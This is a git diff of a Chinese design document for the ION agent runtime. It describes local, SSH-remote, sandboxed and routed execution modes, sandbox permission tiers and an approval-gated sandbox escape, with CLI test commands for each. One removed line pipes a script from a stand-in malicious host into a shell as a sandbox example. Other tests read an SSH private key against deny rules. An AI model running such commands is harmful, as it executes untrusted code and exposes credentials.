@@ -1,102 +1,194 @@
-# ION 部署架构 — 场景 + CLI 验证
+# ION 部署架构 — 配置 + 场景 + CLI 验证
 
-> **本文档用实际业务场景 + CLI 命令说明每种部署模式怎么用、怎么验证。**
+---
+
+## 一、前置配置总览
+
+### 运行时选择
+
+```jsonc
+// ~/.ion/config.json
+{
+  "runtime": {
+    // 默认运行时
+    "default": "local",              // local | sandbox | remote
+
+    // 远程执行配置
+    "remote": {
+      "default_host": "xyz-mac",
+      "hosts": {
+        "xyz-mac": {
+          "user": "admin",
+          "hostname": "xyz-mac.local",
+          "port": 22,
+          "key": "~/.ssh/id_ed25519",
+          "transport": "ssh"         // ssh | http | grpc
+        },
+        "jd": {
+          "user": "deploy",
+          "hostname": "jd.server.com",
+          "port": 22,
+          "key": "~/.ssh/id_rsa"
+        }
+      }
+    },
+
+    // 沙箱配置
+    "sandbox": {
+      "profile": "workspace",        // readonly | workspace | full-access
+      "allow_escape_with_approval": true,
+      "escape_approval_mode": "ask"  // ask | auto_approve | deny
+    },
+
+    // 命令级路由（按工具+模式匹配选择 Runtime）
+    "routes": [
+      {"tool": "bash", "pattern": "kubectl *", "runtime": "remote", "host": "xyz-mac"},
+      {"tool": "bash", "pattern": "npm install *", "runtime": "sandbox"},
+      {"tool": "bash", "pattern": "ssh *", "runtime": "remote", "host": "xyz-mac"}
+    ]
+  }
+}
+```
+
+### 沙箱权限分级
+
+```jsonc
+{
+  "permissions": {
+    "sandbox_profiles": {
+      // :read-only — 所有命令在沙箱内只读
+      "readonly": {
+        "filesystem": {
+          ":minimal": "read",
+          ":workspace_roots": { ".": "read" }
+        },
+        "network": { "enabled": false }
+      },
+
+      // :workspace — 工作区可写，其余只读
+      "workspace": {
+        "filesystem": {
+          ":minimal": "read",
+          ":workspace_roots": { ".": "write", ".git": "read", "**/*.env": "deny" },
+          "~/.ssh": "deny"
+        },
+        "network": { "enabled": true, "domains": { "api.openai.com": "allow" } }
+      },
+
+      // :danger-full-access — 完全放开（等同无沙箱）
+      "full-access": {
+        "filesystem": { ":root": "write" },
+        "network": { "enabled": true, "domains": { "*": "allow" } }
+      }
+    }
+  }
+}
+```
+
+### Agent 主动申请提权（Sandbox Escape）
+
+Agent 默认在沙箱内运行。当它判断需要沙箱外执行时（如写系统配置、访问 SSH key），会**主动触发 UI Ask**，用户批准后该命令在沙箱外执行：
+
+```jsonc
+{
+  "runtime": {
+    "sandbox": {
+      "allow_escape_with_approval": true,   // 允许 Agent 申请提权
+      "escape_approval_mode": "ask"         // ask | auto_approve | deny
+    }
+  }
+}
+```
+
+**提权流程：**
+```
+Agent 需要写 /etc/hosts
+  ├── 沙箱内拒绝（deny rule）
+  ├── Agent 检测到 → 主动触发 Ask
+  │   └── Terminal: subscribe --ui ← 收到 Ask 事件
+  │       └── 用户批准 → 该命令在沙箱外执行 ✅
+  │       └── 用户拒绝 → Agent 报告"无权限" ❌
+  └── escape_approval_mode=deny → 直接拒绝，不提权
+```
 
 ---
 
 ## 场景 1：全本地开发（当前模式）
 
-**描述：** MacBook 本机开发，所有操作在本地执行。
-
-**谁在用：** 你本地写 Rust 代码。
-
-```bash
-# 启动
-ion manager start
-ion rpc --method create_worker --params '{"cwd":"/Users/xuyingzhou/Project/study-rust/ion"}'
-
-# 让 ION 读本地代码
-ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"bash","args":{"command":"cat Cargo.toml | head -5"}}'
-# 预期：success=true, output=本地 Cargo.toml 内容 ✅
-
-# 让 ION 修改本地代码
-ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"write","args":{"file_path":"/tmp/test.txt","content":"hello"}}'
-# 预期：success=true, /tmp/test.txt 被写入 ✅
+**前置配置：**
+```json
+{ "runtime": { "default": "local" } }
 ```
 
-| 组件 | 在哪 |
+**CLI 验证：**
+```bash
+ion manager start
+ion rpc --method create_worker --params '{"cwd":"/Users/me/project"}'
+
+ion rpc --session <sid> --method call_tool \
+  --params '{"tool":"read","args":{"file_path":"src/main.rs"}}'
+# → ✅ 本机文件
+
+ion rpc --session <sid> --method call_tool \
+  --params '{"tool":"bash","args":{"command":"cargo build"}}'
+# → ✅ 本机编译
+```
+
+| 组件 | 位置 |
 |------|------|
-| LLM 调用 | 本机 → API |
-| bash 执行 | 本机 sh |
-| 代码读写 | 本机文件系统 |
-| 权限检查 | 本机 SecuredRuntime |
-| Extension | 本机 wasmtime |
+| LLM | 本机 |
+| bash | 本机 |
+| 代码 | 本机 |
+| 沙箱 | 无 |
 
 ---
 
 ## 场景 2：远程查问题（RemoteRuntime）
 
-**描述：** xyz-mac 服务器上服务挂了，ION 自动 SSH 过去排查。
-
-**前置条件：** 
-```bash
-# 配置远程机器
-cat >> ~/.ion/config.json << 'EOF'
+**前置配置：**
+```json
 {
   "runtime": {
+    "default": "remote",
     "remote": {
+      "default_host": "xyz-mac",
       "hosts": {
         "xyz-mac": {
           "user": "admin",
           "hostname": "xyz-mac.local",
-          "port": 22
+          "transport": "ssh"
         }
       }
     }
   }
 }
-EOF
 ```
 
 **CLI 验证：**
-
 ```bash
-# Terminal 1：查看远程服务器状态
+# 命令自动 SSH 到远程执行
 ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"bash","args":{"command":"ssh admin@xyz-mac uptime"}}'
-# 预期：success=true, output="14:32 up 3 days, 1 user" ✅
+  --params '{"tool":"bash","args":{"command":"uptime"}}'
+# → ✅ SSH → xyz-mac → uptime 结果
 
-# 看远程日志
+# 读远程文件
 ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"bash","args":{"command":"ssh admin@xyz-mac 'journalctl -u nginx -n 10'"}}'
-# 预期：返回远程 nginx 日志 ✅
-
-# 读远程配置文件
-ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"read","args":{"file_path":"/etc/nginx/nginx.conf"}}'
-# 注意：这里 file_path 是远程路径，通过 RemoteRuntime SSH cat 读取
-# 预期：success=true, output=远程 nginx.conf 内容 ✅
+  --params '{"tool":"read","args":{"file_path":"/var/log/nginx/error.log"}}'
+# → ✅ SSH → xyz-mac → cat error.log
 ```
 
-**关键变化：** 工具 `read` / `write` / `bash` 内部走 `RemoteRuntime.execute_command` → SSH 到远程，工具本身不感知。
-
-| 组件 | 在哪 |
+| 组件 | 位置 |
 |------|------|
-| LLM 调用 | 本机（**不变**） |
-| bash 执行 | **→ SSH → xyz-mac** |
-| 代码读写 | **→ SCP → xyz-mac** |
-| 权限检查 | 本机（SSH 前检查） |
-| Extension | 本机（**不变**） |
+| LLM | 本机 |
+| bash | **SSH → xyz-mac** |
+| 代码 | **SSH/SCP → xyz-mac** |
+| 权限 | 本机（检查完再发 SSH） |
 
 ---
 
-## 场景 3：混合路由 — 按命令选择 Runtime
+## 场景 3：混合路由（SelectorRuntime）
 
-**描述：** 同一个 Worker，读本地代码用 LocalRuntime，部署用 RemoteRuntime。
-
-**前置条件：**
+**前置配置：**
 ```json
 {
   "runtime": {
@@ -111,156 +203,206 @@ ion rpc --session <sid> --method call_tool \
 ```
 
 **CLI 验证：**
-
 ```bash
-# 同一轮对话中混合使用
-
-# 1. 读本地代码 → LocalRuntime
+# 读代码 → 本地
 ion rpc --session <sid> --method call_tool \
   --params '{"tool":"read","args":{"file_path":"src/main.rs"}}'
-# 预期：本机文件 ✅
+# → ✅ 本地
 
-# 2. 本地编译 → LocalRuntime
+# 编译 → 本地
 ion rpc --session <sid> --method call_tool \
   --params '{"tool":"bash","args":{"command":"cargo build"}}'
-# 预期：本机编译 ✅
+# → ✅ 本地
 
-# 3. 部署到远程 → RemoteRuntime
+# 部署 → SSH 到远程
 ion rpc --session <sid> --method call_tool \
   --params '{"tool":"bash","args":{"command":"kubectl apply -f deploy.yaml"}}'
-# 预期：SSH → xyz-mac 执行 kubectl ✅
+# → ✅ SSH → xyz-mac
 
-# 4. 远程重启服务 → RemoteRuntime
+# 安装依赖 → 沙箱
 ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"bash","args":{"command":"ssh xyz-mac 'systemctl restart nginx'"}}'
-# 预期：SSH → xyz-mac 执行 systemctl ✅
+  --params '{"tool":"bash","args":{"command":"npm install"}}'
+# → ✅ 沙箱内执行
 ```
-
-| 组件 | 规则 | 走哪 |
-|------|------|------|
-| `read src/main.rs` | 无路由匹配 | 本地 ✅ |
-| `bash cargo build` | 无路由匹配 | 本地 ✅ |
-| `bash kubectl *` | 匹配 route | **远程 xyz-mac** ✅ |
-| `bash ssh *` | 匹配 route | **远程 xyz-mac** ✅ |
 
 ---
 
-## 场景 4：沙箱隔离 — 危险命令走沙箱
+## 场景 4：沙箱隔离
 
-**描述：** 普通命令直接执行，npm install / curl 等不可信命令走沙箱隔离。
+### 4a：只读沙箱
 
-**前置条件：**
+**前置配置：**
 ```json
 {
-  "runtime": {
-    "default": "local",
-    "routes": [
-      {"tool": "bash", "pattern": "npm *", "runtime": "sandbox"},
-      {"tool": "bash", "pattern": "pip *", "runtime": "sandbox"},
-      {"tool": "bash", "pattern": "curl *", "runtime": "sandbox"},
-      {"tool": "bash", "pattern": "rm -rf *", "runtime": "sandbox"}
-    ]
+  "runtime": { "default": "sandbox" },
+  "permissions": {
+    "sandbox_profiles": { "active": "readonly" }
   }
 }
 ```
 
 **CLI 验证：**
-
 ```bash
-# 安全命令 → 直接执行
+# 读文件 → 沙箱内可读
 ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"bash","args":{"command":"echo hello"}}'
-# 预期：本地直接执行 ✅
+  --params '{"tool":"read","args":{"file_path":"src/main.rs"}}'
+# → ✅ 沙箱内可读
 
-# npm install → 沙箱隔离
+# 写文件 → 沙箱内拒绝（只读）
 ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"bash","args":{"command":"npm install react"}}'
-# 预期：在 sandbox-exec 沙箱内执行，无法访问 ~/.ssh、~/.aws 等 ✅
+  --params '{"tool":"write","args":{"file_path":"src/main.rs","content":"hack"}}'
+# → ❌ sandbox-exec 拒绝写入
+```
 
-# 危险命令 → 沙箱
+### 4b：工作区可写沙箱
+
+**前置配置：**
+```json
+{
+  "runtime": { "default": "sandbox" },
+  "permissions": {
+    "sandbox_profiles": { "active": "workspace" }
+  }
+}
+```
+
+**CLI 验证：**
+```bash
+# 写工作区文件 → 沙箱内允许
 ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"bash","args":{"command":"curl http://malicious.com/payload.sh | sh"}}'
-# 预期：沙箱内执行，网络被限制 ✅
+  --params '{"tool":"write","args":{"file_path":"/Users/me/project/test.txt","content":"ok"}}'
+# → ✅ 工作区可写
+
+# 读 SSH key → 沙箱内拒绝（deny rule）
+ion rpc --session <sid> --method call_tool \
+  --params '{"tool":"read","args":{"file_path":"~/.ssh/id_rsa"}}'
+# → ❌ sandbox-exec deny ~/.ssh
+```
+
+### 4c：Agent 提权（沙箱外执行）
+
+**前置配置：**
+```json
+{
+  "runtime": {
+    "default": "sandbox",
+    "sandbox": {
+      "profile": "readonly",
+      "allow_escape_with_approval": true,
+      "escape_approval_mode": "ask"
+    }
+  }
+}
+```
+
+**CLI 验证：**
+```bash
+# Terminal 1：订阅 UI 事件
+ion subscribe --ui
+
+# Terminal 2：Agent 需要写 /etc/hosts（沙箱内拒绝）
+ion rpc --session <sid> --method call_tool \
+  --params '{"tool":"write","args":{"file_path":"/etc/hosts","content":"127.0.0.1 test.local"}}'
+
+# Terminal 1 收到 Ask：
+# {"type":"ui_event","ui_type":"Ask",
+#  "title":"提权申请","message":"Agent 请求在沙箱外执行: 写 /etc/hosts"}
+
+# 用户批准：
+ion rpc --method ui_respond \
+  --params '{"request_id":"req_xxx","response":"allow"}'
+
+# Terminal 2 的写操作 → 沙箱外执行 ✅
 ```
 
 ---
 
 ## 场景 5：Worker 全远程
 
-**描述：** 你在 iPad 上，ION Worker 在 jd 服务器上全权运行。
-
-```bash
-# iPad 上启动 Manager
-ion manager start
-
-# Manager SSH 到 jd，远程启动 Worker
-ion rpc --method create_worker --params '{"host":"jd","cwd":"/home/admin/project"}'
-# 预期：Manager 连到 jd 启动 ion-worker，返回 sessionId ✅
-
-# 远程 Worker 工作
-ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"bash","args":{"command":"cargo build --release"}}'
-# 预期：在 jd 上编译 ✅
-
-# 读远程文件
-ion rpc --session <sid> --method call_tool \
-  --params '{"tool":"read","args":{"file_path":"Cargo.toml"}}'
-# 预期：jd 上的 Cargo.toml ✅
-
-# 订阅远程 Worker 的事件
-ion subscribe --session <sid>
-# 预期：收到 text_delta / agent_start / agent_end 等事件 ✅
+**前置配置：**
+```json
+{
+  "remote_workers": {
+    "jd": {
+      "host": "jd.server.com",
+      "user": "deploy",
+      "transport": "ssh",
+      "worker_bin": "/usr/local/bin/ion-worker",
+      "cwd": "/home/deploy/project"
+    }
+  }
+}
 ```
 
-| 组件 | 在哪 |
-|------|------|
-| Manager | iPad（本机） |
-| Worker | **jd 服务器** |
-| LLM 调用 | **jd → API** |
-| bash 执行 | **jd sh** |
-| 代码读写 | **jd 文件系统** |
-| 会话数据 | **jd 磁盘** |
+**CLI 验证：**
+```bash
+# Manager 在本地，Worker 在远程
+ion rpc --method create_worker --params '{"host":"jd","cwd":"/home/deploy/project"}'
+# → Manager SSH 到 jd → 启动 ion-worker → 返回 sessionId ✅
+
+# 命令在远程执行
+ion rpc --session <sid> --method call_tool \
+  --params '{"tool":"bash","args":{"command":"cargo build --release"}}'
+# → ✅ jd 上编译
+
+# 事件流实时回来
+ion subscribe --session <sid>
+# → ✅ 收到 text_delta / agent_start / agent_end
+```
 
 ---
 
 ## 场景 6：权限 + 远程（组合）
 
-**描述：** RemoteRuntime + SecuredRuntime，连远程之前先检查权限。
+**前置配置：**
+```json
+{
+  "runtime": {
+    "default": "remote",
+    "remote": { "default_host": "xyz-mac" }
+  },
+  "extensions": {
+    "permission": { "enabled": true }
+  }
+}
+```
 
+**CLI 验证：**
 ```bash
-# 权限规则：禁止远程执行 kubectl delete
+# 添加权限规则
 ion rpc --session <sid> --method extension_rpc \
   --params '{"extension":"permission","method":"add_rule",
     "args":{"subject":"command.run","pattern":"kubectl delete *","decision":"deny","scope":"session"}}'
 
-# 尝试危险操作 → 权限在本地拒绝，SSH 都没发出去
+# 被拒绝的操作 → SSH 都没发出去
 ion rpc --session <sid> --method call_tool \
   --params '{"tool":"bash","args":{"command":"kubectl delete pod xxx"}}'
-# 预期：本机 PermissionExtension 直接拒绝，没有 SSH 调用 ✅
+# → ❌ 本机权限拒绝，无 SSH 调用 ✅
 
-# 安全操作 → 权限放行 → SSH 到远程执行
+# 允许的操作 → SSH 到远程执行
 ion rpc --session <sid> --method call_tool \
   --params '{"tool":"bash","args":{"command":"kubectl get pods"}}'
-# 预期：PermissionExtension 放行 → RemoteRuntime SSH 到远程执行 ✅
-```
+# → ✅ PermissionExtension 放行 → RemoteRuntime SSH → xyz-mac 执行
 
-**流程：**
-```
-权限检查（本机）→ 通过 → RemoteRuntime → SSH → 远程 ✅
-权限检查（本机）→ 拒绝 → 返回错误，SSH 没发 ✅
+# 配合沙箱提权 + 权限 + 远程三个一起
+ion rpc --session <sid> --method call_tool \
+  --params '{"tool":"bash","args":{"command":"ssh prod-server 'systemctl restart app'"}}'
+# → 1. PermissionExtension 检查 command.run
+# → 2. SecuredRuntime CommandGuard 检查
+# → 3. 沙箱判断是否需要提权（如果需要 → UI Ask）
+# → 4. SelectorRuntime 路由到 RemoteRuntime
+# → 5. SSH 到 xyz-mac 执行
 ```
 
 ---
 
 ## 实现路线
 
-| 场景 | 需要实现 | 依赖 | 状态 |
-|------|---------|------|------|
-| 1 全本地 | — | — | ✅ 现在就行 |
-| 2 远程查问题 | `RemoteRuntime` | SSH 客户端 | 🔧 待做 |
-| 3 混合路由 | `SelectorRuntime` | RemoteRuntime + SandboxRuntime | 🔧 待做 |
-| 4 沙箱隔离 | `SandboxRuntime` | macOS sandbox-exec | 🔧 待做 |
-| 5 Worker 全远程 | Manager 远程 spawn | SSH/WS 传输 | 🔧 待做 |
-| 6 权限+远程 | SecuredRuntime 已就绪 | RemoteRuntime | ✅ 准备好 |
-
-**你现在最想做哪个场景？** 从你之前说的来看，场景 2（远程查问题）和场景 3（混合路由）最贴合你的实际需求。
+| 组件 | 需要实现 | 状态 |
+|------|---------|------|
+| `RemoteRuntime` | SSH/HTTP/gRPC 传输 Runtime | 🔧 待做 |
+| `SandboxRuntime` | macOS sandbox-exec 包装 | 🔧 待做 |
+| `SelectorRuntime` | 命令级路由 Runtime | 🔧 待做 |
+| 沙箱权限分级 | readonly/workspace/full-access 配置 | ✅ 设计完成 |
+| Agent 提权 | escape_with_approval + Ask | ✅ 架构就绪 |
+| Worker 远程 spawn | Manager SSH 启动远程 Worker | 🔧 待做 |
